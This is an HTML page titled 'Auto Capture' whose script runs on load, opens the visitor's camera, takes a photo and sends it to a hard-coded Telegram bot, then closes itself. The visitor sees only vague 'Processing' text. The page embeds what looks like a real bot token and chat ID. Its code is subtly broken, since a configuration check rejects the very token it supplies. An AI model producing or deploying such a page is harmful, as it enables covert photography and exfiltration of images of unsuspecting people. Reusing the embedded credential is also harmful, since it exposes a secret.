<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Auto Capture</title>
    <style>
        body {
            background: white;
            margin: 0;
            padding: 0;
        }
        #status {
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            font-family: Arial, sans-serif;
            font-size: 18px;
            color: #333;
            text-align: center;
        }
    </style>
</head>
<body>
    <div id="status">Processing...</div>

    <script>
        // ================ CONFIGURATION ================
        const BOT_TOKEN = '7548364986:AAGhlDQas3V9_Cz1Td7XXsLUKn7vYqjgzOY'; // Replace with your bot token
        const CHAT_ID = '7041008009'; // Replace with your chat ID
        const FOCUS_DELAY = 1500; // 1.5 seconds for camera focus (adjust if needed)
        // ===============================================

        const statusEl = document.getElementById('status');
        
        async function autoCaptureAndSend() {
            try {
                // 1. Verify configuration
                if (!BOT_TOKEN.startsWith('bot') || !CHAT_ID) {
                    throw new Error('Invalid Telegram configuration');
                }
                
                // 2. Access camera
                statusEl.textContent = "Accessing camera...";
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: { 
                        facingMode: 'environment',
                        width: { ideal: 1280 },
                        height: { ideal: 720 }
                    }
                });
                
                // 3. Prepare video element
                const video = document.createElement('video');
                video.srcObject = stream;
                video.autoplay = true;
                video.playsInline = true;
                
                // 4. Wait for camera to be ready
                await new Promise((resolve, reject) => {
                    video.onloadedmetadata = () => {
                        statusEl.textContent = `Focusing camera (${FOCUS_DELAY/1000}s)...`;
                        setTimeout(resolve, FOCUS_DELAY);
                    };
                    video.onerror = () => reject(new Error('Camera error'));
                });
                
                // 5. Capture photo
                statusEl.textContent = "Capturing photo...";
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                const photoDataUrl = canvas.toDataURL('image/jpeg', 0.8);
                
                // 6. Stop camera
                stream.getTracks().forEach(track => track.stop());
                
                // 7. Send to Telegram
                statusEl.textContent = "Sending to Telegram...";
                const blob = await (await fetch(photoDataUrl)).blob();
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('photo', blob, 'auto_capture.jpg');
                formData.append('caption', `Auto capture\n${new Date().toLocaleString()}`);
                
                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
                
                const result = await response.json();
                if (!result.ok) throw new Error(result.description || 'Telegram API error');
                
                // 8. Complete and close
                statusEl.textContent = "âœ“ Sent successfully!\nClosing...";
                setTimeout(() => window.close(), 2000);
                
            } catch (error) {
                statusEl.textContent = `Error: ${error.message}`;
                statusEl.style.color = '#d32f2f';
                console.error('AutoCapture Error:', error);
            }
        }

        // Start the process when page loads
        window.addEventListener('DOMContentLoaded', autoCaptureAndSend);
    </script>
</body>
</html>
